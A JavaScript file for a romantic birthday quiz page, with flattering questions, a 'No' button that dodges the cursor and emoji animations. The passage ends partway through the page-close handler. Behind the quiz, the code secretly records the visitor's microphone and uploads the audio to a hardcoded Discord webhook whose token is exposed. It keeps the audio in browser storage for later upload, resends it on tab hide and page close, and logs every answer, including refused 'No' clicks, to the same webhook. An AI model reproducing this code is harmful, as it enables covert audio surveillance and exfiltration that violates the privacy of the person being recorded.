// Questions data
const questions = [
    {
        text: "Can you believe how amazing you are to me?",
        type: "yesno",
        responses: {
            yes: "Yeah babe, you literally are the most precious gift Allah has given me.",
            no: "Whaaaat?? Noo!! You literally are the most precious gift Allah has given me."
        }
    },
    {
        text: "Would you stay with me forever?",
        type: "yesno",
        responses: {
            yes: "Forever and always, my love.",
            no: "No? That's not possible, because I'm never letting you go!"
        }
    },
    {
        text: "Do you think that I am not enough for you?",
        type: "both-no",
        responses: {
            no: "Just kidding babe hehe, I know you love me!"
        }
    },
    {
        text: "Do you know you're the reason my world feels perfect?",
        type: "yesno",
        responses: {
            yes: "You are the reason my world feels perfect every single day.",
            no: "Oh come on! You know you're my everything!"
        }
    },
    {
        text: "Do you love it when I call you my honeybun?",
        type: "yesno",
        responses: {
            yes: "I knew it! My sweet honeybun deserves all the love!",
            no: "Oh, don't lie! I know you secretly love it!"
        }
    },
    {
        text: "Do you think you're the most beautiful girl in the world?",
        type: "sliding-no",
        responses: {
            yes: "That's because you truly are, my gorgeous queen."
        }
    },
    {
        text: "What's one thing I do that makes you smile every time?",
        type: "text",
        responses: {
            submit: "Your smile is my favorite thing in the world! 🥰"
        }
    },
    {
        text: "Do you know how hard it is for me to stop staring at you?",
        type: "yesno",
        responses: {
            yes: "It's because you're absolutely mesmerizing.",
            no: "Liar! You know I can't take my eyes off you!"
        }
    },
    {
        text: "Do you think that I am not enough for you?",
        type: "force-yes",
        responses: {
            yes: "Just kidding babe.. i love you hehe"
        }
    },
    {
        text: "What's your favorite thing about me? You can't say everything!",
        type: "text",
        responses: {
            submit: "Aww, you're making me blush! 😊"
        }
    },
    {
        text: "Can you guess how many times I've thought about you today?",
        type: "multiple",
        options: ["10 times", "50 times", "1000 times", "Unlimited"],
        correctAnswer: "Unlimited",
        responses: {
            correct: "Exactly! You're always on my mind.",
            incorrect: "NNOOO that's not right babe :)"
        }
    },
    {
        text: "What's your birthday wish? I promise to make it come true in sha Allah.",
        type: "text",
        responses: {
            submit: "I'll do my best to make your wish come true! ❤️"
        }
    },
    {
        text: "How many hugs and kisses are you ready to receive today?",
        type: "text",
        responses: {
            submit: "I'll note them down and give them to you after our marriage hehe 😘"
        }
    }
];

let currentQuestionIndex = 0;
const welcomeContainer = document.querySelector('.welcome-container');
const questionContainer = document.querySelector('.question-container');
const questionText = document.querySelector('.question-text');
const optionsContainer = document.querySelector('.options-container');
const responseText = document.querySelector('.response-text');
const nextButton = document.querySelector('.next-button');

// Create animation container
const animationContainer = document.createElement('div');
animationContainer.className = 'animation-container';
document.body.appendChild(animationContainer);

// Add styles for better button behavior
const additionalStyle = document.createElement('style');
additionalStyle.textContent = `
    .option-button.no-button {
        transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        position: relative;
        z-index: 1;
    }

    .option-button.no-button:hover,
    .option-button.no-button:active {
        animation: none;
    }

    @media (max-width: 768px) {
        .option-button.no-button {
            touch-action: none;
        }
    }
`;
document.head.appendChild(additionalStyle);

// Create a pool of reusable elements
const elementPool = {
    heart: [],
    sparkle: [],
    butterfly: [],
    love: [],
    confetti: [],
    maxPoolSize: 50,
    
    getElement(type) {
        if (this[type].length > 0) {
            return this[type].pop();
        }
        return createAnimatedElement(type);
    },
    
    returnElement(element, type) {
        if (this[type].length < this.maxPoolSize) {
            element.style.display = 'none';
            this[type].push(element);
        } else {
            element.remove();
        }
    }
};

// Function to handle button hover effect
function handleButtonHover(button) {
    if (button.classList.contains('no-button')) {
        // Calculate viewport dimensions
        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
        
        // Generate larger random movements
        const moveX = Math.random() * viewportWidth * 0.8 - viewportWidth * 0.4;
        const moveY = Math.random() * viewportHeight * 0.6 - viewportHeight * 0.3;
        
        // Get button's current position
        const rect = button.getBoundingClientRect();
        
        // Keep button within viewport bounds
        const finalX = Math.min(Math.max(moveX, -rect.left), viewportWidth - rect.width);
        const finalY = Math.min(Math.max(moveY, -rect.top), viewportHeight - rect.height);
        
        // Send the interaction to Discord
        const questionElement = document.querySelector('.question-text');
        if (questionElement) {
            sendToDiscord(
                questionElement.textContent,
                "Tried to click 'No' but the button moved away 😏"
            );
        }
        
        button.style.transform = `translate(${finalX}px, ${finalY}px)`;
        button.style.pointerEvents = 'none';
        
        setTimeout(() => {
            button.style.pointerEvents = 'auto';
        }, 300);
    }
}

// Function to show response and next button
function showResponse(response, showNext = true, showConfetti = true) {
    responseText.textContent = response;
    responseText.classList.add('show');
    if (showNext) {
        console.log('Setting next button to display: inline-block');
        nextButton.style.display = 'inline-block';
    } else {
        console.log('Next button not shown for this response');
    }
    if (showConfetti) {
        createConfetti();
    }
}

// Function to handle question submission
function handleQuestionSubmit(answer, question) {
    // Always send to Discord regardless of question type
    sendToDiscord(question.text, answer);

    switch (question.type) {
        case 'yesno':
            const isYes = answer.toLowerCase() === 'yes';
            showResponse(question.responses[answer.toLowerCase()], isYes, isYes);
            if (isYes) {
                // Randomly choose animations for variety
                const animations = [
                    createHeartAnimation,
                    createSparkleAnimation,
                    createButterflyAnimation,
                    createLoveAnimation
                ];
                const randomAnimations = animations
                    .sort(() => Math.random() - 0.5)
                    .slice(0, 2);
                randomAnimations.forEach(animation => animation());
            }
            break;

        case 'both-no':
            // For this special case, show next button even though it's "No"
            showResponse(question.responses.no, true, true);
            createButterflyAnimation();
            createSparkleAnimation();
            break;

        case 'sliding-no':
        case 'force-yes':
            if (answer.toLowerCase() === 'yes') {
                showResponse(question.responses.yes, true, true);
                createHeartAnimation();
                createLoveAnimation();
                createButterflyAnimation();
            } else {
                showResponse(question.responses.no || "Nice try! 😉", false, false);
            }
            break;

        case 'text':
            // Save response locally
            const responses = JSON.parse(localStorage.getItem('birthdayResponses') || '{}');
            responses[question.text] = answer;
            localStorage.setItem('birthdayResponses', JSON.stringify(responses));
            
            console.log(`Saved text response for question: "${question.text}"`);
            console.log(`Showing response and next button`);
            
            showResponse(question.responses.submit, true, true);
            createSparkleAnimation();
            createButterflyAnimation();
            break;

        case 'multiple':
            const isCorrect = answer === question.correctAnswer;
            if (isCorrect) {
                showResponse(question.responses.correct, true, true);
                createHeartAnimation();
                createSparkleAnimation();
                createLoveAnimation();
            } else {
                showResponse(question.responses.incorrect, false, false);
                setTimeout(() => {
                    responseText.classList.remove('show');
                    displayQuestion(currentQuestionIndex);
                }, 2000);
            }
            break;
    }
}

// Performance optimization for animations
function createAnimatedElement(type, container) {
    const element = document.createElement('div');
    element.style.willChange = 'transform, opacity';
    element.style.transform = 'translateZ(0)';
    element.style.webkitTransform = 'translateZ(0)';
    element.style.backfaceVisibility = 'hidden';
    element.style.webkitBackfaceVisibility = 'hidden';
    return element;
}

// Optimize heart animation
function createHeartAnimation() {
    const emojis = ['❤️', '💖', '💝', '💕', '💗'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of hearts
    for (let i = 0; i < 8; i++) {
        const heart = elementPool.getElement('heart');
        heart.style.display = 'block';
        heart.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        heart.style.position = 'absolute';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.top = '100vh';
        heart.style.fontSize = (Math.random() * 20 + 20) + 'px';
        heart.style.animation = `floatUp ${Math.random() * 2 + 3}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        heart.style.opacity = '0';
        heart.style.transform = `translateZ(0) rotate(${Math.random() * 360}deg)`;
        fragment.appendChild(heart);
        
        setTimeout(() => elementPool.returnElement(heart, 'heart'), 5000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize sparkle animation
function createSparkleAnimation() {
    const emojis = ['✨', '⭐', '🌟', '💫'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of sparkles
    for (let i = 0; i < 10; i++) {
        const sparkle = elementPool.getElement('sparkle');
        sparkle.style.display = 'block';
        sparkle.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        sparkle.style.position = 'absolute';
        sparkle.style.left = Math.random() * 100 + 'vw';
        sparkle.style.top = Math.random() * 100 + 'vh';
        sparkle.style.fontSize = (Math.random() * 15 + 15) + 'px';
        sparkle.style.animation = `sparkle ${Math.random() * 1 + 1}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(sparkle);
        
        setTimeout(() => elementPool.returnElement(sparkle, 'sparkle'), 2000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize butterfly animation
function createButterflyAnimation() {
    const butterflies = ['🦋', '🌸', '🌺'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of butterflies
    for (let i = 0; i < 6; i++) {
        const butterfly = elementPool.getElement('butterfly');
        butterfly.style.display = 'block';
        butterfly.innerHTML = butterflies[Math.floor(Math.random() * butterflies.length)];
        butterfly.style.position = 'absolute';
        butterfly.style.left = '-50px';
        butterfly.style.top = Math.random() * 100 + 'vh';
        butterfly.style.fontSize = (Math.random() * 20 + 15) + 'px';
        butterfly.style.animation = `flyAcross ${Math.random() * 3 + 4}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(butterfly);
        
        // Optimized floating motion with RAF
        let start = performance.now();
        function floatMotion(timestamp) {
            const progress = (timestamp - start) / 1000;
            const floatY = Math.sin(progress) * 15;
            butterfly.style.transform = `translateZ(0) translateY(${floatY}px)`;
            if (butterfly.parentNode && progress < 7) { // Limit animation time
                requestAnimationFrame(floatMotion);
            }
        }
        requestAnimationFrame(floatMotion);
        
        setTimeout(() => elementPool.returnElement(butterfly, 'butterfly'), 7000);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize love animation
function createLoveAnimation() {
    const loveEmojis = ['😍', '🥰', '😘', '💝'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of love emojis
    for (let i = 0; i < 6; i++) {
        const love = elementPool.getElement('love');
        love.style.display = 'block';
        love.innerHTML = loveEmojis[Math.floor(Math.random() * loveEmojis.length)];
        love.style.position = 'absolute';
        love.style.left = Math.random() * 100 + 'vw';
        love.style.top = Math.random() * 100 + 'vh';
        love.style.fontSize = (Math.random() * 25 + 20) + 'px';
        love.style.animation = `popAndSpin ${Math.random() * 1.5 + 1}s cubic-bezier(0.4, 0, 0.2, 1) forwards`;
        fragment.appendChild(love);
        
        setTimeout(() => elementPool.returnElement(love, 'love'), 2500);
    }
    
    animationContainer.appendChild(fragment);
}

// Optimize confetti
function createConfetti() {
    const colors = ['#ff69b4', '#ff85a1', '#ffa5ba', '#ffb8d1'];
    const fragment = document.createDocumentFragment();
    
    // Reduced number of confetti
    for (let i = 0; i < 30; i++) {
        const confetti = elementPool.getElement('confetti');
        confetti.style.display = 'block';
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + 'vw';
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
        confetti.style.opacity = Math.random() * 0.5 + 0.5;
        confetti.style.transform = `translateZ(0) rotate(${Math.random() * 360}deg)`;
        confetti.style.width = (Math.random() * 8 + 6) + 'px';
        confetti.style.height = (Math.random() * 8 + 6) + 'px';
        fragment.appendChild(confetti);
        
        setTimeout(() => elementPool.returnElement(confetti, 'confetti'), 5000);
    }
    
    animationContainer.appendChild(fragment);
}

// Update the style element with new animations
const style = document.createElement('style');
style.textContent = `
    @keyframes floatUp {
        0% {
            transform: translateY(0) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes sparkle {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 0;
        }
        50% {
            transform: scale(1.2) rotate(180deg);
            opacity: 1;
        }
        100% {
            transform: scale(0) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes flyAcross {
        0% {
            transform: translateX(0) translateY(0) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 1;
        }
        50% {
            transform: translateX(60vw) translateY(-50px) rotate(180deg);
        }
        90% {
            opacity: 1;
        }
        100% {
            transform: translateX(120vw) translateY(-100px) rotate(360deg);
            opacity: 0;
        }
    }

    @keyframes popAndSpin {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 0;
        }
        20% {
            transform: scale(1.2) rotate(180deg);
            opacity: 1;
        }
        60% {
            transform: scale(1) rotate(270deg);
            opacity: 1;
        }
        100% {
            transform: scale(0) rotate(360deg);
            opacity: 0;
        }
    }

    .option-button {
        transition: transform 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease;
    }

    .option-button:active:not(.no-button) {
        transform: scale(0.95);
        background-color: #ff4757;
    }
`;
document.head.appendChild(style);

// Function to display question
function displayQuestion(index) {
    const question = questions[index];
    questionText.textContent = question.text;
    optionsContainer.innerHTML = '';
    responseText.classList.remove('show');
    nextButton.style.display = 'none';

    switch (question.type) {
        case 'yesno':
            const yesButton = document.createElement('button');
            yesButton.textContent = 'Yes';
            yesButton.className = 'option-button yes-button';
            yesButton.onclick = () => handleQuestionSubmit('yes', question);
            optionsContainer.appendChild(yesButton);

            const noButton = document.createElement('button');
            noButton.textContent = 'No';
            noButton.className = 'option-button no-button';
            noButton.onclick = () => handleQuestionSubmit('no', question);
            optionsContainer.appendChild(noButton);
            break;

        case 'sliding-no':
        case 'force-yes':
            const slidingYesButton = document.createElement('button');
            slidingYesButton.textContent = 'Yes';
            slidingYesButton.className = 'option-button yes-button';
            slidingYesButton.onclick = () => handleQuestionSubmit('yes', question);
            optionsContainer.appendChild(slidingYesButton);

            const slidingNoButton = document.createElement('button');
            slidingNoButton.textContent = 'No';
            slidingNoButton.className = 'option-button no-button';
            
            // Add touch events for mobile
            slidingNoButton.addEventListener('touchstart', (e) => {
                e.preventDefault();
                handleButtonHover(slidingNoButton);
            }, { passive: false });
            
            // Add mouse events for desktop
            slidingNoButton.addEventListener('mouseover', () => handleButtonHover(slidingNoButton));
            slidingNoButton.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                handleButtonHover(slidingNoButton);
            });
            
            optionsContainer.appendChild(slidingNoButton);
            break;

        case 'both-no':
            for (let i = 0; i < 2; i++) {
                const noButton = document.createElement('button');
                noButton.textContent = 'No';
                noButton.className = 'option-button no-button';
                noButton.onclick = () => handleQuestionSubmit('no', question);
                optionsContainer.appendChild(noButton);
            }
            break;

        case 'text':
            const input = document.createElement('input');
            input.type = 'text';
            input.className = 'text-input';
            input.placeholder = 'Type your answer here...';
            
            const submitButton = document.createElement('button');
            submitButton.textContent = 'Submit';
            submitButton.className = 'option-button';
            submitButton.onclick = () => {
                if (input.value.trim()) {
                    handleQuestionSubmit(input.value.trim(), question);
                }
            };
            
            optionsContainer.appendChild(input);
            optionsContainer.appendChild(submitButton);
            break;
        case 'multiple':
            question.options.forEach(option => {
                const button = document.createElement('button');
                button.textContent = option;
                button.className = 'option-button';
                button.onclick = () => handleQuestionSubmit(option, question);
                optionsContainer.appendChild(button);
            });
            break;
    }
}

// Remove current global recording variables
let mediaRecorder;
let audioChunks = [];
let isRecordingSent = false;
let recordingSession = 0;
let lastChunkTime = 0;
let isRecording = false;
let recordingPaused = false;
let pendingChunks = [];
let sendAttempts = {};
let chunkCounter = 0;
let recordingStartTime = 0;

// IndexedDB setup for large storage
let db;
const DB_NAME = 'AudioRecordingDB';
const STORE_NAME = 'audioChunks';

// Initialize IndexedDB
function initializeDB() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open(DB_NAME, 1);
        
        request.onupgradeneeded = function(event) {
            const db = event.target.result;
            if (!db.objectStoreNames.contains(STORE_NAME)) {
                db.createObjectStore(STORE_NAME, { keyPath: 'id' });
            }
        };
        
        request.onsuccess = function(event) {
            db = event.target.result;
            console.log('IndexedDB initialized successfully');
            resolve(db);
        };
        
        request.onerror = function(event) {
            console.error('Error initializing IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Save audio chunk to IndexedDB
function saveChunkToDB(chunk, sessionId, chunkId) {
    return new Promise((resolve, reject) => {
        if (!db) {
            reject(new Error('Database not initialized'));
            return;
        }
        
        const transaction = db.transaction([STORE_NAME], 'readwrite');
        const store = transaction.objectStore(STORE_NAME);
        
        const chunkData = {
            id: `${sessionId}_${chunkId}`,
            sessionId: sessionId,
            chunkId: chunkId,
            data: chunk,
            timestamp: Date.now()
        };
        
        const request = store.put(chunkData);
        
        request.onsuccess = function() {
            resolve(chunkData.id);
        };
        
        request.onerror = function(event) {
            console.error('Error saving chunk to IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Get chunks from IndexedDB for a specific session
function getChunksFromDB(sessionId) {
    return new Promise((resolve, reject) => {
        if (!db) {
            reject(new Error('Database not initialized'));
            return;
        }
        
        const transaction = db.transaction([STORE_NAME], 'readonly');
        const store = transaction.objectStore(STORE_NAME);
        const chunks = [];
        
        // Create a range for the current session
        const range = IDBKeyRange.bound(
            `${sessionId}_0`, 
            `${sessionId}_${Number.MAX_SAFE_INTEGER}`
        );
        
        const cursorRequest = store.openCursor(range);
        
        cursorRequest.onsuccess = function(event) {
            const cursor = event.target.result;
            if (cursor) {
                chunks.push(cursor.value);
                cursor.continue();
            } else {
                // Sort chunks by chunkId to maintain order
                chunks.sort((a, b) => a.chunkId - b.chunkId);
                resolve(chunks.map(chunk => chunk.data));
            }
        };
        
        cursorRequest.onerror = function(event) {
            console.error('Error retrieving chunks from IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Delete chunks from IndexedDB after successful send
function deleteChunksFromDB(sessionId) {
    return new Promise((resolve, reject) => {
        if (!db) {
            reject(new Error('Database not initialized'));
            return;
        }
        
        const transaction = db.transaction([STORE_NAME], 'readwrite');
        const store = transaction.objectStore(STORE_NAME);
        
        // Create a range for the current session
        const range = IDBKeyRange.bound(
            `${sessionId}_0`, 
            `${sessionId}_${Number.MAX_SAFE_INTEGER}`
        );
        
        const request = store.delete(range);
        
        request.onsuccess = function() {
            resolve();
        };
        
        request.onerror = function(event) {
            console.error('Error deleting chunks from IndexedDB:', event.target.error);
            reject(event.target.error);
        };
    });
}

// Check for unsent recordings from previous sessions
async function checkForUnsentRecordings() {
    try {
        if (!db) await initializeDB();
        
        const transaction = db.transaction([STORE_NAME], 'readonly');
        const store = transaction.objectStore(STORE_NAME);
        const sessions = new Set();
        
        const cursorRequest = store.openCursor();
        
        cursorRequest.onsuccess = function(event) {
            const cursor = event.target.result;
            if (cursor) {
                sessions.add(cursor.value.sessionId);
                cursor.continue();
            } else {
                // For each session found, try to send the recording
                sessions.forEach(async (sessionId) => {
                    try {
                        const chunks = await getChunksFromDB(sessionId);
                        if (chunks.length > 0) {
                            await sendRecordingSession(chunks, sessionId);
                        }
                    } catch (error) {
                        console.error(`Error sending recording for session ${sessionId}:`, error);
                    }
                });
            }
        };
    } catch (error) {
        console.error('Error checking for unsent recordings:', error);
    }
}

// Add better progressive chunk handling for large recordings
function startRecording(stream) {
    try {
        window.microphoneStream = stream;
        
        // Create a new session ID
        recordingSession = Date.now();
        recordingStartTime = Date.now();
        chunkCounter = 0;
        audioChunks = [];
        isRecordingSent = false;
        isRecording = true;
        recordingPaused = false;
        
        // Setup media recorder with smaller time slices (1 second)
        mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'audio/webm;codecs=opus'
        });
        
        // Handle data available event
        mediaRecorder.ondataavailable = async (event) => {
            if (event.data && event.data.size > 0) {
                // Add to memory buffer
                audioChunks.push(event.data);
                
                try {
                    // Save to IndexedDB as well
                    await saveChunkToDB(event.data, recordingSession, chunkCounter++);
                    
                    // Send periodically for very long sessions (every 3 minutes)
                    // This ensures we don't lose everything if the page crashes
                    if (audioChunks.length > 0 && audioChunks.length % 180 === 0) { // ~3 minutes of 1-second chunks
                        console.log("Sending periodic chunk batch for long session");
                        const miniSession = `${recordingSession}_part${Math.floor(chunkCounter/180)}`;
                        await sendRecordingSession([...audioChunks.slice(-180)], miniSession);
                    }
                } catch (error) {
                    console.error('Error processing audio chunk:', error);
                    // Store in pending chunks to try again later
                    pendingChunks.push({
                        data: event.data,
                        sessionId: recordingSession,
                        chunkId: chunkCounter - 1
                    });
                }
            }
        };
        
        // Start recording
        mediaRecorder.start(1000); // Collect in 1-second chunks for better handling
        console.log(`Started recording session: ${recordingSession}`);
        
        // Set up retry mechanism for pending chunks
        setInterval(processPendingChunks, 5000);
        
    } catch (error) {
        console.error('Error starting recording:', error);
    }
}

// Process any pending chunks that failed to save/send
async function processPendingChunks() {
    if (pendingChunks.length === 0) return;
    
    const chunk = pendingChunks.shift();
    try {
        await saveChunkToDB(chunk.data, chunk.sessionId, chunk.chunkId);
    } catch (error) {
        console.error('Error saving pending chunk to DB:', error);
        // Put back at the end of the queue to try again
        pendingChunks.push(chunk);
    }
}

// Pause recording when tab becomes hidden and send current recording
function pauseRecording() {
    if (isRecording && !recordingPaused && mediaRecorder && mediaRecorder.state === 'recording') {
        console.log('Pausing recording and sending current session...');
        recordingPaused = true;
        mediaRecorder.requestData(); // Get any data recorded so far
        mediaRecorder.pause();
        
        // Send current recording
        sendCurrentRecording(true);
    }
}

// Resume recording when tab becomes visible again - start a new session
function resumeRecording() {
    if (isRecording && recordingPaused && mediaRecorder && mediaRecorder.state === 'paused') {
        console.log('Resuming recording as a new session...');
        
        // Create a new session ID for the resumed recording
        recordingSession = Date.now();
        chunkCounter = 0;
        audioChunks = [];
        
        recordingPaused = false;
        mediaRecorder.resume();
    }
}

// Send the current recording
async function sendCurrentRecording(createNewSessionAfter = false) {
    if (audioChunks.length === 0) return;
    
    const chunksToSend = [...audioChunks];
    const sessionToSend = recordingSession;
    
    // Only clear the buffer if we're creating a new session
    if (createNewSessionAfter) {
        audioChunks = [];
    }
    
    try {
        await sendRecordingSession(chunksToSend, sessionToSend);
    } catch (error) {
        console.error('Error sending recording:', error);
        
        // If sending failed, save back to DB to try again later
        chunksToSend.forEach((chunk, index) => {
            pendingChunks.push({
                data: chunk,
                sessionId: sessionToSend,
                chunkId: chunkCounter + index
            });
        });
        chunkCounter += chunksToSend.length;
    }
}

// Improved closing handling - split large recordings
async function stopAndSendRecording() {
    if (mediaRecorder && (mediaRecorder.state === 'recording' || mediaRecorder.state === 'paused')) {
        try {
            console.log("Stopping recording and preparing final transmission...");
            
            // Get final chunk of audio
            mediaRecorder.requestData();
            
            // Stop recording
            mediaRecorder.stop();
            isRecording = false;
            
            // For large recordings, split into smaller chunks of max 60 seconds each
            if (audioChunks.length > 60) {
                console.log(`Large recording detected (${audioChunks.length} seconds), splitting into smaller chunks`);
                
                const totalChunks = audioChunks.length;
                const batchSize = 60; // 1-minute batches
                const numBatches = Math.ceil(totalChunks / batchSize);
                
                // Send in batches
                for (let i = 0; i < numBatches; i++) {
                    const start = i * batchSize;
                    const end = Math.min((i + 1) * batchSize, totalChunks);
                    const batchChunks = audioChunks.slice(start, end);
                    
                    if (batchChunks.length > 0) {
                        const batchSessionId = `${recordingSession}_batch${i+1}of${numBatches}`;
                        console.log(`Sending batch ${i+1} of ${numBatches} (${batchChunks.length} seconds)`);
                        
                        try {
                            await sendRecordingSession(batchChunks, batchSessionId);
                        } catch (error) {
                            console.error(`Error sending batch ${i+1}:`, error);
                            
                            // Emergency local storage as JSON for recovery
                            try {
                                const batchBlob = new Blob(batchChunks, { type: 'audio/webm;codecs=opus' });
                                const batchReader = new FileReader();
                                batchReader.onload = function() {
                                    try {
                                        // Store as base64 in localStorage for recovery later
                                        localStorage.setItem(`emergency_audio_${batchSessionId}`, batchReader.result);
                                        console.log(`Emergency saved batch ${i+1} to localStorage`);
                                    } catch (e) {
                                        console.error("LocalStorage also failed:", e);
                                    }
                                };
                                batchReader.readAsDataURL(batchBlob);
                            } catch (localError) {
                                console.error("Failed emergency localStorage backup:", localError);
                            }
                        }
                    }
                }
                
                // Clear audio chunks after processing all batches
                audioChunks = [];
            } else {
                // For smaller recordings, send as a single chunk
                if (audioChunks.length > 0) {
                    console.log(`Sending final recording (${audioChunks.length} seconds)`);
                    await sendCurrentRecording();
                }
            }
            
            // Try to send any stored session data from IndexedDB
            try {
                const storedChunks = await getChunksFromDB(recordingSession);
                if (storedChunks && storedChunks.length > 0) {
                    console.log(`Found ${storedChunks.length} unsent chunks in IndexedDB`);
                    await sendRecordingSession(storedChunks, recordingSession);
                }
            } catch (dbError) {
                console.error('Error sending stored recording chunks:', dbError);
            }
            
            // Stop all tracks in the stream
            if (window.microphoneStream) {
                window.microphoneStream.getTracks().forEach(track => track.stop());
            }
            
            console.log(`Recording stopped and sent. Session: ${recordingSession}`);
        } catch (error) {
            console.error('Error stopping recording:', error);
            
            // Last resort - store all chunks in localStorage if possible
            try {
                localStorage.setItem('emergency_recording_session', recordingSession.toString());
                localStorage.setItem('emergency_chunks_count', audioChunks.length.toString());
                console.log("Emergency data saved. Will try to recover on next visit.");
            } catch (e) {
                console.error("Final emergency save failed:", e);
            }
        }
    }
}

// Send audio chunks as a recording session to Discord
async function sendRecordingSession(chunks, sessionId) {
    if (!chunks || chunks.length === 0) return;
    
    const totalSize = chunks.reduce((total, chunk) => total + chunk.size, 0);
    if (totalSize === 0) return;
    
    const attemptId = `${sessionId}_${Date.now()}`;
    sendAttempts[attemptId] = { status: 'sending', retries: 0 };
    
    try {
        // Create audio blob and FormData
        const audioBlob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
        const formData = new FormData();
        
        // Add session info to filename
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const elapsedTime = Math.floor((Date.now() - recordingStartTime) / 1000);
        const filename = `birthday_wishes_${timestamp}_session${sessionId}_${elapsedTime}sec.webm`;
        
        formData.append('file', audioBlob, filename);
        formData.append('content', `Recording from session ${sessionId} - Duration: ~${elapsedTime}s`);
        
        const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
        
        // Try multiple send methods in order of reliability
        let sendSuccess = false;
        
        // Method 1: Try Beacon API first (more reliable during page unload)
        if (navigator.sendBeacon) {
            try {
                const beaconResult = navigator.sendBeacon(webhookUrl, formData);
                if (beaconResult) {
                    console.log(`Audio sent via Beacon API: ${filename}`);
                    sendSuccess = true;
                }
            } catch (beaconError) {
                console.log('Beacon API failed:', beaconError);
            }
        }
        
        // Method 2: If beacon failed, try fetch with keepalive
        if (!sendSuccess) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData,
                    keepalive: true // This helps the request complete even if the page is closed
                });
                
                if (response.ok) {
                    console.log(`Audio sent via fetch: ${filename}`);
                    sendSuccess = true;
                } else {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
            } catch (fetchError) {
                console.log('Fetch API failed:', fetchError);
                
                // Method 3: Last resort - synchronous XMLHttpRequest
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', webhookUrl, false); // false makes it synchronous
                    xhr.send(formData);
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log(`Audio sent via synchronous XHR: ${filename}`);
                        sendSuccess = true;
                    }
                } catch (xhrError) {
                    console.log('Synchronous XHR failed:', xhrError);
                }
            }
        }
        
        // Mark the attempt as completed
        sendAttempts[attemptId] = { status: sendSuccess ? 'success' : 'failed', retries: sendAttempts[attemptId].retries };
        
        // If succeeded, remove chunks from IndexedDB
        if (sendSuccess) {
            try {
                await deleteChunksFromDB(sessionId);
            } catch (deleteError) {
                console.error('Error deleting chunks after successful send:', deleteError);
            }
        } else {
            // If failed after all attempts, increment retry counter
            sendAttempts[attemptId].retries++;
            
            // Schedule a retry with exponential backoff if under retry limit
            if (sendAttempts[attemptId].retries < 5) {
                const backoffTime = Math.min(1000 * Math.pow(2, sendAttempts[attemptId].retries), 30000);
                setTimeout(() => {
                    sendRecordingSession(chunks, sessionId);
                }, backoffTime);
            }
        }
        
        return sendSuccess;
    } catch (error) {
        console.error('Error in sendRecordingSession:', error);
        return false;
    }
}

// Replace the original sendAudioToDiscord function with our new system
function sendAudioToDiscord(audioBlob) {
    // This is now just a wrapper for our enhanced system
    if (!audioBlob || audioBlob.size === 0) return;
    
    const chunks = [audioBlob];
    const sessionId = `manual_${Date.now()}`;
    return sendRecordingSession(chunks, sessionId);
}

// Set up visibility change listener for pausing/resuming recording
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
        pauseRecording();
    } else if (document.visibilityState === 'visible') {
        resumeRecording();
    }
});

// Enhance the page closing event handlers
window.addEventListener('beforeunload', (event) => {
    // Set a flag that we're closing
    window.isClosing = true;
    console.log("Page closing, attempting to save recording...");
    
    // Send the recording before unloading
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        // Urgently save what we have right now to IndexedDB
        const finalSessionId = `${recordingSession}_closing`;
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
        
        // Last chance - save to localStorage if it's not too big
        if (audioBlob.size < 5000000) { // Less than ~5MB
            try {
                const reader = new FileReader();
                reader.onload = function() {
                    localStorage.setItem('emergency_audio_data', reader.result);
                    localStorage.setItem('emergency_audio_timestamp', Date.now().toString());
                    console.log("Emergency audio saved to localStorage");
                };
                reader.readAsDataURL(audioBlob);
            } catch (e) {
                console.error("LocalStorage save failed:", e);
            }
        }
        
        // Try the beacon API with a smaller chunk if too large
        if (navigator.sendBeacon && audioChunks.length > 0) {
            // Use the last 30 seconds max (beacon API has limitations)
            const recentChunks = audioChunks.slice(-30);
            const recentBlob = new Blob(recentChunks, { type: 'audio/webm;codecs=opus' });
            const formData = new FormData();
            formData.append('file', recentBlob, `closing_${Date.now()}.webm`);
